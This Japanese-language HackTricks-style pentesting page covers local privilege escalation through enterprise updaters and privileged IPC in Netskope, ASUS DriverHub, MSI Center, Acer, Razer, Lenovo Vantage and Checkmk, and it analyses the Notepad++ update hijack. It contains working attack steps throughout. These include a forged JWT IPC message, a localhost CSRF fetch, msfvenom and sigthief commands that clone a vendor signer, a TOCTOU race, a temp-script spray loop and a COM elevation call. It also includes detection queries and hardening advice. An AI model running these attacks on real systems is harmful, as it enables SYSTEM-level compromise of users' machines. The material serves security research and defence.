# Enterprise Auto-Updaters と Privileged IPC の悪用（例：Netskope、ASUS、MSI）

{{#include ../../banners/hacktricks-training.md}}

このページでは、enterprise endpoint agent および updater で見つかった、Windows local privilege escalation chain の一種を一般化します。これらは、簡単に利用できる IPC surface と privileged update flow を公開しています。代表的な例は、Netskope Client for Windows < R129（CVE-2025-0309）です。このケースでは、low-privileged user が attacker-controlled server への enrollment を強制し、その後、SYSTEM service に malicious MSI をインストールさせることができます。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

類似製品に対して応用できる主なアイデア：
- privileged service の localhost IPC を悪用し、attacker server への re-enrollment または reconfiguration を強制する。
- vendor の update endpoints を実装し、rogue Trusted Root CA を配布したうえで、updater の接続先を malicious な「signed」package に向ける。
- signer check（CN allow-list）、optional digest flags、緩い MSI properties を回避する。
- IPC が「encrypted」の場合、registry に保存された、すべてのユーザーから読み取り可能な machine identifiers から key/IV を導出する。
- service が image path/process name によって caller を制限している場合、allow-list に登録された process に inject するか、process を suspended 状態で起動し、最小限の thread-context patch によって DLL を bootstrap する。

---
## 1) localhost IPC 経由で attacker server への enrollment を強制する

多くの agent は、JSON を使用して localhost TCP 経由で SYSTEM service と通信する user-mode UI process を搭載しています。

Netskope で確認された内容：
- UI: stAgentUI（low integrity）↔ Service: stAgentSvc（SYSTEM）
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) backend host（例：AddonUrl）を制御する claims を含む JWT enrollment token を作成する。署名を不要にするため、alg=None を使用する。
2) JWT と tenant name を指定し、provisioning command を呼び出す IPC message を送信する：
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) サービスが enrollment/config のために攻撃者のサーバーへリクエストを開始する、例:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- 呼び出し元の検証がパス/名前ベースの場合は、allow-list に登録されたベンダーのバイナリからリクエストを送信する（§4を参照）。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) update channel をハイジャックして SYSTEM としてコードを実行する

クライアントがあなたのサーバーと通信したら、想定されるエンドポイントを実装し、攻撃者の MSI へ誘導する。一般的なシーケンス:

1) /v2/config/org/clientconfig → 非常に短い updater の間隔を含む JSON config を返す。例:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate を返す。サービスはこれを Local Machine Trusted Root store にインストールする。
3) /v2/checkupdate → malicious MSI と fake version を指す metadata を提供する。

実際の環境で見られる一般的なチェックの bypass:
- Signer CN allow-list: サービスは Subject CN が “netSkope Inc” または “Netskope, Inc.” と一致するかだけをチェックする場合がある。rogue CA でその CN を持つ leaf を発行し、MSI に署名できる。
- CERT_DIGEST property: CERT_DIGEST という名前の benign な MSI property を含める。インストール時には enforcement がない。
- Optional digest enforcement: config flag（例: check_msi_digest=false）で追加の cryptographic validation を無効化する。

結果として、SYSTEM service は
C:\ProgramData\Netskope\stAgent\data\*.msi
から MSI をインストールし、NT AUTHORITY\SYSTEM として arbitrary code を実行する。<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass の教訓: vendor が update source を cryptographically authenticate せず、少数の “trusted” domains を allow-list することで対応してきた場合は、通信の誘導を依然として許している vendor-owned redirectors や reverse proxies を探す。Netskope の場合、公開された follow-up research により、R129-era の allow-list は `rproxy.goskope.com` を介して依然として abuse 可能であり、この proxy は attacker-controlled Azure App Service content を転送していた。hostname allow-list は trust boundary ではなく、単なる speed bump と考えるべきである。<sup>[[14]](#references)</sup>

---
## 3) Forging encrypted IPC requests (when present)

R127 以降、Netskope は IPC JSON を Base64 のように見える encryptData field でラップしていた。Reversing により、任意の user が readable な registry values から key/IV を導出する AES が使われていることが判明した:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers は encryption を再現し、standard user から valid encrypted commands を送信できる。<sup>[[1]](#references)[[2]](#references)</sup> General tip: agent が突然 IPC を “encrypt” し始めた場合は、HKLM 配下の device IDs、product GUIDs、install IDs が material として使われていないか探す。

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

一部の services は、TCP connection の PID を解決し、image path/name を Program Files 配下にある allow-listed vendor binaries（例: stagentui.exe、bwansvc.exe、epdlp.exe）と比較することで peer の authenticate を試みる。

実用的な bypass は 2 つある:
- allow-listed process（例: nsdiag.exe）へ DLL injection を行い、その内部から IPC を proxy する。
- allow-listed binary を suspended 状態で spawn し、CreateRemoteThread を使わずに proxy DLL を bootstrap する（§5 を参照）。これにより driver-enforced tamper rules を満たす。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products は、protected processes への handles から dangerous rights を取り除く minifilter/OB callbacks driver（例: Stadrv）を搭載していることが多い:
- Process: PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUME を削除する
- Thread: THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZE に制限する

これらの制約に対応する reliable user-mode loader:
1) CREATE_SUSPENDED を指定して vendor binary の CreateProcess を行う。
2) なお許可されている handles を取得する: process には PROCESS_VM_WRITE | PROCESS_VM_OPERATION、thread には THREAD_GET_CONTEXT/THREAD_SET_CONTEXT（または、既知の RIP で code を patch する場合は THREAD_RESUME のみ）。
3) ntdll!NtContinue（または、早期に確実に map される別の thunk）を、DLL path に対して LoadLibraryW を呼び出し、その後に戻る tiny stub で overwrite する。
4) ResumeThread を実行して in-process で stub を trigger し、DLL をロードする。

protected process に対して PROCESS_CREATE_THREAD や PROCESS_SUSPEND_RESUME を使用しておらず（process 自体を作成したため）、driver の policy を満たす。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) は rogue CA、malicious MSI signing、および必要な endpoints（/v2/config/org/clientconfig、/config/ca/cert、/v2/checkupdate）の serve を自動化する。<sup>[[3]](#references)</sup>
- UpSkope は arbitrary な（任意で AES-encrypted にできる）IPC messages を craft する custom IPC client であり、allow-listed binary から originate するための suspended-process injection も含む。<sup>[[4]](#references)</sup>

## 7) Fast triage workflow for unknown updater/IPC surfaces

新しい endpoint agent や motherboard の “helper” suite に遭遇した場合、簡単な workflow で、それが有望な privesc target かどうかを通常は判断できる:<sup>[[6]](#references)</sup>

1) loopback listeners を enumerate し、vendor processes に map する:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) 候補となる named pipes を列挙する:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) プラグインベースのIPCサーバーが使用するレジストリに保存されたルーティングデータを収集する：
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) まず user-mode client から endpoint names、JSON keys、command IDs を抽出します。Packed Electron/.NET frontends は、full schema を頻繁に leak します：
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) 最終的にプロセスを起動するコードパスだけでなく、実際の信頼判定条件を探す:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
優先して確認する価値のあるパターン:
- `CryptQueryObject`/証明書の解析が `WinVerifyTrust` なしで行われている場合、通常は「証明書が存在する」ことを「証明書が信頼されている」こととして扱っていることを意味し、証明書の cloning やその他の fake-signer tricks が可能になる。
- `Origin`、`Referer`、download URLs、process names、signer CNs に対する substring/suffix checks は authentication ではない。`contains(".vendor.com")` は、攻撃者が制御する lookalike domains によって通常 exploitable になる。
- low-privileged GUI が「file is trusted」と判断し、SYSTEM broker がその結果を単に利用している場合、client-side DLL/JS を patch または reimplement するだけで、境界全体を bypass できることが多い（Razer-style split validation）。
- broker が payload を `%TEMP%`/`C:\Windows\Temp` にコピーし、そのパスから validate または schedule している場合は、直ちに TOCTOU replacement windows と、より弱い checks を持つ代替 `ExecuteTask()` wrappers を公開する sibling plugin modules をテストする。<sup>[[6]](#references)</sup>

named-pipe-heavy targets では、プロトコルを詳細に reversing し始める前に、PipeViewer を使うと weak DACLs と remotely reachable pipes を素早く確認できる。<sup>[[11]](#references)</sup>

target が callers を PID、image path、または process name だけで authenticate している場合、それを boundary ではなく speed bump と考えること。legitimate client への injecting、または allow-listed process から connection を作成するだけで、server の checks を満たせることが多い。named pipes については、[client impersonation と pipe abuse に関するこのページ](named-pipe-client-impersonation.md)で、この primitive をより詳しく説明している。

---
## 8) vendor signatures のみで authenticated された modular add-in brokers（Lenovo Vantage pattern）

新たに探す価値のある variation として、**signed-client RPC broker** がある。これは low-privileged な Lenovo-signed desktop process が SYSTEM service と通信し、その service が `%ProgramData%` 配下の XML-described add-ins に JSON commands を routing する構成である。いずれかの accepted signed client **内部で** code execution を達成すると、すべての `runas="system"` contracts が attack surface の一部になる。<sup>[[15]](#references)</sup>

Lenovo Vantage research で確認された high-value primitives:
- **vendor によって signed されていることを理由に caller を信頼する**: researchers は、Lenovo-signed EXE を writable directory にコピーし、DLL side-load（`profapi.dll`）を満たすことで authenticated context に到達した。これにより、service がすでに信頼している client 内部で arbitrary code が実行された。
- **Manifest-driven attack surface discovery**: add-ins は `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` 配下で宣言されている。複数の contracts が `SYSTEM` として実行されるため、これらの manifests を列挙すると、broker 自体を reversing するよりも早く、実際の privileged verbs を発見できることが多い。
- **authenticated channel の背後にある per-command bugs**: trusted client 内部に入ると、public research により、update/install verbs の path-traversal + race conditions、privileged settings databases に対する raw-SQL abuse、意図された hive 外への writes を可能にする substring-based registry path checks が発見された。

target で役立つ recon:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
実践的な要点: helper suite が、まず **caller process** を認証し、その後に多数の plugin/add-in コマンドへディスパッチする broker を公開している場合、フロントドアの trust check をバイパスしただけで止めてはいけません。manifest/contract table をダンプし、各 high-privilege verb を個別に fuzz してください。認証済み channel の背後には、通常、複数の second-stage bug が隠れています。

---
## 1) 特権 HTTP API に対する Browser-to-localhost CSRF (ASUS DriverHub)

DriverHub は 127.0.0.1:53000 上で user-mode HTTP service (ADU.exe) を提供します。この service は、https://driverhub.asus.com から送信された browser call を想定しています。Origin filter は、Origin header と `/asus/v1.0/*` から公開される download URL に対して、単純に `string_contains(".asus.com")` を実行します。そのため、`https://driverhub.asus.com.attacker.tld` のような attacker-controlled host は check を通過し、JavaScript から state-changing request を発行できます。<sup>[[6]](#references)</sup> 追加の bypass pattern については、[CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) を参照してください。

実践的な流れ:
1) `.asus.com` を含む domain を登録し、そこに malicious webpage をホストします。
2) `fetch` または XHR を使用して、`http://127.0.0.1:53000` 上の privileged endpoint (例: `Reboot`, `UpdateApp`) を呼び出します。
3) handler が想定する JSON body を送信します。packed frontend JS に以下の schema が示されています。
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
以下に示す PowerShell CLI でさえ、Origin ヘッダーを信頼された値に偽装すると成功します。
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
したがって、攻撃者のサイトをブラウザで訪問するだけで、SYSTEM helperを動作させる1-click（または `onload` を介した0-click）のlocal CSRFになります。

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` は、JSON bodyで指定された任意の実行ファイルをダウンロードし、`C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` にキャッシュします。Download URLの検証では同じsubstring logicが再利用されているため、`http://updates.asus.com.attacker.tld:8000/payload.exe` も受け入れられます。ダウンロード後、ADU.exeは実行前に、PEにsignatureが含まれていることと、Subject stringがASUSと一致することだけをチェックします。`WinVerifyTrust` もchain validationもありません。

このフローをweaponizeするには、次の手順を実行します。
1) payloadを作成する（例: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
2) ASUSのsignerをpayloadにcloneする（例: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
3) `.asus.com` のlookalike domainで `pwn.exe` をホストし、上記のbrowser CSRFを介してUpdateAppをtriggerする。

OriginとURLのfilterがどちらもsubstring-basedであり、signer checkもstringの比較しか行わないため、DriverHubは攻撃者のbinaryを取得し、elevated contextで実行します。<sup>[[6]](#references)</sup>

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI CenterのSYSTEM serviceは、各frameが `4-byte ComponentID || 8-byte CommandID || ASCII arguments` で構成されるTCP protocolを公開しています。core component（Component ID `0f 27 00 00`）には `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` が含まれています。そのhandlerは次の処理を行います。
1) 指定されたexecutableを `C:\Windows\Temp\MSI Center SDK.exe` にcopyする。
2) `CS_CommonAPI.EX_CA::Verify` によってsignatureを検証する（certificate subjectは “MICRO-STAR INTERNATIONAL CO., LTD.” と一致し、`WinVerifyTrust` が成功する必要があります）。
3) temp fileをSYSTEMとして、攻撃者が制御するargumentsで実行するscheduled taskを作成する。

copyされたfileは、検証から `ExecuteTask()` までの間、lockされません。攻撃者は次の処理を実行できます。
- 正規のMSI-signed binaryを指すFrame Aを送信する（signature checkが通過し、taskがqueueに入ることを保証します）。
- 検証完了直後に `MSI Center SDK.exe` を上書きするmalicious payloadを指すFrame B messagesを繰り返し送信し、raceを発生させる。

schedulerが起動すると、元のfileを検証済みであるにもかかわらず、上書きされたpayloadがSYSTEMとして実行されます。Reliable exploitationでは、2つのgoroutine/threadでCMD_AutoUpdateSDKをspamし、TOCTOU windowを奪取します。<sup>[[6]](#references)</sup>

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` がloadするすべてのplugin/DLLは、`HKLM\SOFTWARE\MSI\MSI_CentralServer` に保存されたComponent IDを受け取ります。frameの最初の4 bytesがそのcomponentを選択するため、攻撃者は任意のmoduleにcommandをrouteできます。
- pluginは独自のtask runnerを定義できます。`Support\API_Support.dll` は `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` を公開し、signature validationなしで `API_Support.EX_Task::ExecuteTask()` を直接callします。これにより、任意のlocal userが `C:\Users\<user>\Desktop\payload.exe` を指定し、確実にSYSTEM executionを得られます。
- Wiresharkでloopbackをsniffするか、dnSpyで.NET binariesをinstrumentすれば、Componentとcommandのmappingをすぐに明らかにできます。その後、custom Go/Python clientsでframeをreplayできます。<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe`（SYSTEM）は `\\.\pipe\treadstone_service_LightMode` を公開しており、そのdiscretionary ACLはremote clients（例: `\\TARGET\pipe\treadstone_service_LightMode`）を許可します。file pathを指定してcommand ID `7` を送信すると、serviceのprocess-spawning routineが呼び出されます。
- client libraryは、argsとともにmagic terminator byte（113）をserializeします。Frida/`TsDotNetLib` によるdynamic instrumentation（instrumentationのヒントについては [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) を参照）により、native handlerがこのvalueを `SECURITY_IMPERSONATION_LEVEL` とintegrity SIDにmapしてから `CreateProcessAsUser` をcallしていることが分かります。
- 113（`0x71`）を114（`0x72`）にswapすると、full SYSTEM tokenを維持し、high-integrity SID（`S-1-16-12288`）を設定するgeneric branchに入ります。そのため、spawnされたbinaryはlocalでもcross-machineでも、制限のないSYSTEMとして実行されます。
- これをexposed installer flag（`Setup.exe -nocheck`）と組み合わせれば、lab VM上でもACCを起動し、vendor hardwareなしでpipeを利用できます。<sup>[[6]](#references)</sup>

これらのIPC bugsは、localhost servicesがmutual authentication（ALPC SIDs、`ImpersonationLevel=Impersonation` filters、token filtering）を強制しなければならない理由と、各moduleの「任意のbinaryをrunする」helperが同じsigner verificationsを共有しなければならない理由を示しています。

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4は、このfamilyにおけるもう1つの有用なpatternを追加しました。low-privileged userは、`RzUtility.Elevator`を介してprocessをlaunchするようCOM helperに要求できますが、trust decisionはprivileged boundary内でrobustにenforceされるのではなく、user-mode DLL（`simple_service.dll`）にdelegateされています。

Observed exploitation path:
- COM object `RzUtility.Elevator`をinstantiateする。
- `LaunchProcessNoWait(<path>, "", 1)` をcallして、elevated launchをrequestする。
- public PoCでは、requestを発行する前に `simple_service.dll` 内のPE-signature gateをpatch outし、攻撃者が選択した任意のexecutableをlaunchできるようにします。<sup>[[6]](#references)[[10]](#references)</sup>

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
一般的な要点: 「helper」suite を reverse するときは、localhost TCP や named pipes だけで調査を終えてはいけません。`Elevator`、`Launcher`、`Updater`、`Utility` などの名前を持つ COM classes を確認し、privileged service が target binary 自体を実際に検証しているのか、それとも patch 可能な user-mode client DLL が計算した結果を単に信頼しているだけなのかを検証してください。このパターンは Razer に限らず一般化できます。high-privilege broker が low-privilege 側から allow/deny の判定を受け取る分離設計は、privesc surface の候補です。


---
## MSI repair 中の予測可能な temp script 実行（Checkmk Agent / CVE-2024-0670）

一部の Windows agents は、依然として `C:\Windows\Temp` に一時 `.cmd` を書き込み、それを `SYSTEM` として実行することで privileged action を実装しています。ファイル名が予測可能で、service が既存ファイルを安全に再作成しない場合、low-privileged user は将来使用される temp file を **read-only** として事前作成できます。これにより、privileged process は自身の script ではなく、attacker-controlled content を実行します。

脆弱な Checkmk Agent builds で確認された内容:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`、`2.1.0`、`2.2.0`
- trigger: cached agent package の MSI **repair**<sup>[[8]](#references)[[9]](#references)</sup>

実践的な workflow:
1. 現在の process IDs または実行中の agent PID から、現実的な PID range を推定します。
2. 短い **ASCII** `.cmd` payload（`Set-Content -Encoding Ascii` または `cmd.exe` redirection）を書き込みます。batch files では UTF-16 の PowerShell output を避けてください。
3. 候補 range 全体に `C:\Windows\Temp\cmk_all_<PID>_1.cmd` を spray し、各 file を read-only に設定します。
4. cached MSI の repair を trigger し、privileged service が temp script を再生成してから実行するようにします。<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
脆弱な製品が Windows Installer でインストールされている場合は、修復をトリガーする前に、`C:\Windows\Installer` 配下にあるランダムに見えるキャッシュ済み MSI を製品名に対応付けます:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
運用上の注意:
- `msiexec /fa` が非対話型の WinRM shell から失敗し、既存のデスクトップ/切断セッションによって repair が正しくトリガーされるかを確認する必要がある場合、`qwinsta` が役立ちます。<sup>[[7]](#references)</sup>
- このパターンは、**world-writable な場所に一時スクリプトを配置し、後で SYSTEM として実行する**他の endpoint agent や updater にも一般化できます。予測可能な名前、exclusive create semantics の欠如、オンデマンドでトリガー可能な repair/update flow をテストしてください。

---
## 弱い updater 検証を介したリモート supply-chain hijack (WinGUp / Notepad++)

2025 年 6 月から 2025 年 12 月にかけて、Notepad++ の update flow の背後にある hosting infrastructure を侵害した攻撃者が、選択した被害者に対して悪意のある manifest を選択的に配信しました。古い WinGUp ベースの updater は update の authenticity を完全には検証しなかったため、悪意のある XML response により client を攻撃者が管理する URL へ redirect できました。client は、信頼できる certificate chain と、download した installer 上の有効な PE signature の両方を強制せずに HTTPS content を受け入れていたため、被害者は trojanized NSIS `update.exe` を download して実行しました。<sup>[[12]](#references)[[13]](#references)</sup>

Operational flow (local exploit は不要):
1. **Infrastructure interception**: CDN/hosting を侵害し、悪意のある download URL を指す attacker metadata とともに update check に応答する。
2. **Trojanized NSIS**: installer が payload を fetch/execute し、2 つの execution chain を悪用する:
- **Bring-your-own signed binary + sideload**: signed Bitdefender `BluetoothService.exe` を同梱し、その search path に悪意のある `log.dll` を配置する。signed binary が実行されると、Windows が `log.dll` を sideload し、これが Chrysalis backdoor (Warbird-protected + static detection を妨げる API hashing) を復号して reflectively load する。
- **Scripted shellcode injection**: NSIS が compiled Lua script を実行し、Win32 APIs (例: `EnumWindowStationsW`) を使用して shellcode を inject し、Cobalt Strike Beacon を stage する。<sup>[[12]](#references)</sup>

任意の auto-updater に対する Hardening/detection の要点:
- download した installer の **certificate + signature verification** を強制する (vendor signer を pin し、不一致の CN/chain を reject する)。また、update manifest 自体にも signature (例: XMLDSig) を付ける。manifest が制御する redirect は、検証されない限り block する。
- **BYO signed binary sideloading** を download 後の detection pivot として扱う。signed vendor EXE が canonical install path 外の DLL name を load した場合 (例: Bitdefender が Temp/Downloads から `log.dll` を load) や、updater が Temp から non-vendor signature の installer を drop/execute した場合に alert する。
- この chain で確認された **malware-specific artifacts** を monitor する (generic pivot として有用): mutex `Global\Jdhfv_1.0.1`、`%TEMP%` への異常な `gup.exe` writes、Lua-driven shellcode injection stages。
- Notepad++ は v8.8.9 以降で WinGUp を強化して対応した。返される XML は現在 signed (XMLDSig) であり、新しい build では transport だけを信頼するのではなく、download した installer の certificate + signature verification を強制する。<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> がNotepad++以外のインストーラーを起動</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

これらのパターンは、署名されていないマニフェストを受け入れる、または installer signer の pinning に失敗するあらゆる updater に当てはまります。network hijack + malicious installer + BYO-signed sideloading により、「trusted」な update を装って remote code execution が可能になります。

---
## 参考資料
- [1] [Advisory – Netskope Client for Windows – Rogue Server 経由の Local Privilege Escalation (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub、MSI Center、Acer Control Centre、Razer Synapse 4 の Pwning](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent の writable files 経由の Local Privilege Escalation](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent の Privilege escalation](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors による Notepad++ Supply Chain の Exploit](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Netskope Client for Windows の CVE-2025-0309 に対する fix の Bypassing](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage の Privilege Escalation Bugs の Uncovering](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
